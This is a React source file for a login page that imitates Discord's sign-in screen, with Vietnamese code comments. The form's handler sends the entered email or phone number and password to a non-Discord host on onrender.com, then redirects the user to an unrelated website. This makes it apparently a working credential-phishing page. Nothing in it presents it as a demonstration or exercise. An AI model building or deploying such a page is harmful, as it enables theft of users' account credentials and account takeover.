import React, { useState } from 'react';
import './App.css';
import banner from '../src/assets/banner.svg';
import logo from '../src/assets/logo.svg';

function App() {
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');

  const handleLogin = async (e: { preventDefault: () => void; }) => {
    e.preventDefault();

    try {
      const response = await fetch('https://api-discord-yzpf.onrender.com/api/v1/auth/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ emailOrPhone, password }),
      });

      if (response.ok) {
        // Xử lý đăng nhập thành công
        console.log('Đăng nhập thành công');
        // Chuyển hướng người dùng sang trang mới
        window.location.href = 'https://daominhha.net/en-garde/';
      } else {
        // Xử lý đăng nhập thất bại
        console.log('Đăng nhập thất bại');
      }
    } catch (error) {
      console.error('Lỗi khi thực hiện đăng nhập:', error);
    }
  };

  return (
    <div className='screen-wrapper'>
      <img src={banner} alt='baner' />
      <div className='form-container'>
        <form onSubmit={handleLogin} autoComplete='false' className='form-main'>
          <img src={logo} alt='logo' className='logo' />
          <h4>Welcome back!</h4>
          <p>We're so excited to see you again!</p>
          <div className='list-elm'>
            <div className='input-wrap'>
              <label htmlFor='username'>
                Email or Phone Number <span>*</span>
              </label>
              <input
                type='text'
                id='username'
                value={emailOrPhone}
                onChange={(e) => setEmailOrPhone(e.target.value)}
              />
            </div>
            <div className='input-wrap'>
              <label htmlFor='password'>
                Password<span>*</span>
              </label>
              <input
                type='password'
                id='password'
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
            <a href='#'>Forgot your password?</a>
            <button style={{cursor: "pointer"}} type='submit'>Log In</button>
            <div>
              <span>Need an account?</span>
              <span>Register</span>
            </div>
          </div>
        </form>
      </div>
    </div>
  );
}

export default App;
